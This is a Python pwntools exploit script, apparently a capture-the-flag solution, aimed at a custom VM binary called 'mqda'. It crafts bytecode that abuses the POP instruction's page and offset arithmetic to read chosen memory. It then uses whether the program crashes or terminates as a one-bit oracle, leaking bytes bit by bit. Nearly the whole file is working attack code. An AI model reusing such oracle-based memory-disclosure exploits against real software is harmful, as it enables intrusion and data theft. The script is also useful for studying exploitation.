#!/usr/bin/env python3
"""
MQDA Exploit - Bit-by-Bit Oracle (Corrected)

POP instruction reads from address (SP + 4).
The address is interpreted as: page = addr >> 8, offset = addr & 0xFF.
So to read from VM address A, we need SP = A - 4.

But there's a catch: (A - 4) >> 8 must equal A >> 8 for single-page read.
This works when A & 0xFF >= 4.

For A & 0xFF < 4 (like A = 0x10000, 0x10001, 0x10002, 0x10003):
  SP = A - 4 has different page than A
  
So we should read from offset >= 4, like code_addr + 4.
"""
from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'error'

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def pop_reg(reg):
    return bytes([0x03, reg])

def shl_reg_imm(reg, imm32):
    return bytes([0x4b, reg]) + p32(imm32)

def shr_reg_imm(reg, imm32):
    return bytes([0x4c, reg]) + p32(imm32)

def cmp_reg_reg(reg1, reg2):
    return bytes([0x2d, reg1, reg2])

def jne_reg(reg):
    return bytes([0x10, reg])

def trigger_illegal():
    return bytes([0xFF])

def create_leak_code(code_addr, read_addr, bit_position, expected_bit):
    """Create code that tests a bit at read_addr."""
    code = b''
    
    # Set SP so that [SP + 4] = read_addr
    # This means SP = read_addr - 4
    # BUT: the paging splits address as page = (addr >> 8), offset = (addr & 0xFF)
    # [SP + 4] actually means: page[(SP & 0xFF) + 4]
    # where page is determined by (SP >> 8)
    
    # To read from read_addr:
    # We need (SP >> 8) = (read_addr >> 8) (same page)
    # And (SP & 0xFF) + 4 = (read_addr & 0xFF)
    # So SP & 0xFF = (read_addr & 0xFF) - 4
    
    # For this to work, (read_addr & 0xFF) >= 4
    # Otherwise, we get offset underflow
    
    read_offset = read_addr & 0xFF
    if read_offset < 4:
        # Can't read offsets 0-3 with POP, need different address
        # For now, skip
        raise ValueError(f"Cannot read offset {read_offset} with POP")
    
    sp_value = (read_addr & 0xFFFFFF00) | ((read_offset - 4) & 0xFF)
    
    code += mov_reg_imm(15, sp_value)
    code += pop_reg(0)
    
    # Isolate bit
    shl_amount = 31 - bit_position
    if shl_amount > 0:
        code += shl_reg_imm(0, shl_amount)
    code += shr_reg_imm(0, 31)
    
    code += mov_reg_imm(1, expected_bit)
    code += cmp_reg_reg(0, 1)
    
    current = code_addr + len(code)
    hlt_addr = current + 6 + 2 + 1
    code += mov_reg_imm(2, hlt_addr)
    code += jne_reg(2)
    code += trigger_illegal()
    code += hlt()
    
    return code

def test_bit(code_addr, read_addr, bit_position, expected_bit=1):
    """Test if bit at read_addr equals expected_bit."""
    try:
        code = create_leak_code(code_addr, read_addr, bit_position, expected_bit)
    except ValueError:
        return False
    
    p = process(['./mqda'])
    p.recvuntil(b'Code Address> ')
    p.sendline(str(code_addr).encode())
    p.recvuntil(b'Code Length> ')
    p.sendline(str(len(code)).encode())
    p.recvuntil(b'Code> ')
    p.send(code)
    p.recvuntil(b'Entry IP> ')
    p.sendline(str(code_addr).encode())
    
    output = p.recvall(timeout=2)
    p.close()
    
    return b'TERMINATED' in output

def leak_byte(code_addr, read_addr):
    """Leak a byte at read_addr."""
    val = 0
    for bit in range(8):
        if test_bit(code_addr, read_addr, bit, 1):
            val |= (1 << bit)
    return val

def main():
    # Code at 0x10000, read from 0x10004 (offset 4 in same page)
    code_addr = 0x10000
    read_addr = 0x10004  # 5th byte of code
    
    print("[*] MQDA Corrected Oracle Test")
    print(f"[*] Code at: 0x{code_addr:x}")
    print(f"[*] Reading from: 0x{read_addr:x}")
    
    # The 5th byte of our code is part of MOV_REG_IMM's immediate value
    # Code structure: MOV r15, imm32 (6 bytes) = [0x41, 0x0F, imm32_bytes]
    # Byte 0: 0x41
    # Byte 1: 0x0F  
    # Bytes 2-5: immediate (SP value)
    
    # Let's create known data to read
    # Actually, let's read byte at offset 0x10 which should be part of our code
    read_addr = 0x10010
    
    print(f"[*] Reading byte at 0x{read_addr:x}...")
    byte = leak_byte(code_addr, read_addr)
    print(f"[*] Leaked: 0x{byte:02x}")

if __name__ == '__main__':
    main()
